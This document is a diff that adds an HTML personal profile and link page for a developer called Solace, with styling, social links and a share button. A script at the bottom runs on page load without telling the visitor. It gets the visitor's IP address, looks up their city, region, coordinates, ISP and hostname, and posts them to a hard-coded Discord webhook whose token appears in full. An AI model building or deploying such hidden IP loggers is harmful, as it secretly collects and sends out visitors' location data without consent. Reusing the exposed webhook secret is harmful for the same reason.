@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solace - Developer, Founder, Player</title>
+    <meta name="description" content="Solace: A developer, founder, and gamer sharing knowledge and building innovative projects.">
+    <meta property="og:title" content="Solace - Developer, Founder, Player">
+    <meta property="og:description" content="Solace: A developer, founder, and gamer sharing knowledge and building innovative projects.">
+    <meta property="og:image" content="8ba0339e-c3fe-4341-bfe8-03135b886188.webp">
+    <meta property="og:image:type" content="image/webp">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="theme-color" content="#1E90FF">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+    <style>
+        /* General Styles */
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #1e1e2f, #2a2a40);
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: #1E90FF;
+            margin-bottom: 10px;
+        }
+        p {
+            font-size: 1rem;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 20px;
+        }
+        /* Profile Section */
+        .profile-info {
+            margin-bottom: 30px;
+        }
+        .profile-picture {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin: 0 auto 15px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+        }
+        .profile-name {
+            font-size: 2rem;
+            font-weight: bold;
+            color: #1E90FF;
+        }
+        .profile-location {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 10px 0;
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.7);
+        }
+        .profile-location svg {
+            width: 16px;
+            height: 16px;
+            margin-right: 5px;
+        }
+        .profile-bio {
+            font-size: 1rem;
+            color: rgba(255, 255, 255, 0.8);
+        }
+        /* Links Section */
+        .links {
+            margin-top: 20px;
+        }
+        .link-button {
+            display: block;
+            background-color: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            padding: 12px 20px;
+            margin: 10px auto;
+            border-radius: 6px;
+            text-decoration: none;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+        .link-button:hover {
+            background-color: rgba(255, 255, 255, 0.2);
+            transform: translateY(-2px);
+        }
+        /* Footer */
+        footer {
+            margin-top: 30px;
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.6);
+        }
+        footer a {
+            color: #1E90FF;
+            text-decoration: none;
+        }
+        footer a:hover {
+            text-decoration: underline;
+        }
+        /* Share Button */
+        .share-button {
+            background-color: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            margin: 20px auto;
+            display: inline-block;
+        }
+        .share-button:hover {
+            background-color: rgba(255, 255, 255, 0.2);
+            transform: translateY(-2px);
+        }
+    </style>
+</head>
+<body>
+    <!-- Profile Section -->
+    <div class="container">
+        <div class="profile-info">
+            <img src="8ba0339e-c3fe-4341-bfe8-03135b886188.webp" alt="Solace Profile Picture" class="profile-picture">
+            <h1 class="profile-name">Welcome to Solace's World</h1>
+            <div class="profile-location">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"></path>
+                    <circle cx="12" cy="10" r="3"></circle>
+                </svg>
+                England
+            </div>
+            <p class="profile-bio">I'm a developer, founder, and gamer passionate about building innovative projects and sharing my journey with others.</p>
+        </div>
+
+        <!-- Share Button -->
+        <button class="share-button" id="share-button">Share</button>
+
+        <!-- Links Section -->
+        <div class="links">
+            <a href="https://tiktok.com/@ceosolace" target="_blank" class="link-button">TikTok</a>
+            <a href="#" target="_blank" class="link-button">Twitter (Coming Soon)</a>
+            <a href="https://discord.com/users/ceosolace" target="_blank" class="link-button">Discord: @ceosolace</a>
+            <a href="#" target="_blank" class="link-button">YouTube Channel (Coming Soon)</a>
+            <a href="https://github.com/tfssolacedev/" target="_blank" class="link-button">GitHub Profile</a>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            © 2025 Solace. All rights reserved. <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a>
+        </div>
+    </footer>
+
+    <script>
+        // Global flag to control running state
+        let is_active = true;
+
+        // Function to fetch visitor's IP address
+        async function fetchVisitorIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error fetching IP address:', error);
+                return null;
+            }
+        }
+
+        // Function to fetch Whois information for an IP
+        async function fetchWhoisForIP(ipAddress) {
+            try {
+                const response = await fetch(`https://ipinfo.io/${ipAddress}/json`);
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                const data = await response.json();
+                return data;
+            } catch (error) {
+                console.error('Error fetching Whois information:', error);
+                return null;
+            }
+        }
+
+        // Function to send visitor info to Discord webhook
+        async function sendVisitorInfoToDiscord(visitorInfo) {
+            try {
+                const webhookUrl = 'https://discord.com/api/webhooks/1364333839631122573/01wis4woFMsU8MFiKj4lhOXbBaRhwgPTJ02MDPs6qtAzQuTLBvNOsphEccZHb-XpVy7j';
+                
+                const payload = {
+                    embeds: [
+                        {
+                            title: "Visitor Info",
+                            color: 16711680, // Red color
+                            fields: [
+                                { name: "IP Address", value: visitorInfo.ip || "N/A", inline: true },
+                                { name: "City", value: visitorInfo.city || "N/A", inline: true },
+                                { name: "Region", value: visitorInfo.region || "N/A", inline: true },
+                                { name: "Country", value: visitorInfo.country || "N/A", inline: true },
+                                { name: "Location", value: visitorInfo.loc || "N/A", inline: true },
+                                { name: "Organization", value: visitorInfo.org || "N/A", inline: true },
+                                { name: "Hostname", value: visitorInfo.hostname || "N/A", inline: true }
+                            ]
+                        }
+                    ]
+                };
+
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                console.log('Visitor info sent to Discord.');
+            } catch (error) {
+                console.error('Error sending visitor info to Discord:', error);
+            }
+        }
+
+        // Function to send IP and Whois information
+        async function sendIPAndWhois() {
+            const ipAddress = await fetchVisitorIP();
+            if (ipAddress) {
+                const whoisInfo = await fetchWhoisForIP(ipAddress);
+                if (whoisInfo) {
+                    await sendVisitorInfoToDiscord(whoisInfo);
+                }
+            }
+        }
+
+        // Initialize the page
+        window.onload = () => {
+            // Send the IP address and Whois information to the Discord webhook
+            sendIPAndWhois();
+
+            // Share button functionality
+            document.getElementById('share-button').addEventListener('click', () => {
+                if (navigator.share) {
+                    navigator.share({
+                        title: 'Solace - Developer, Founder, Player',
+                        url: window.location.href,
+                    }).catch((error) => console.error('Error sharing:', error));
+                } else {
+                    alert('Sharing is not supported in this browser.');
+                }
+            });
+        };
+    </script>
+</body>
+</html>
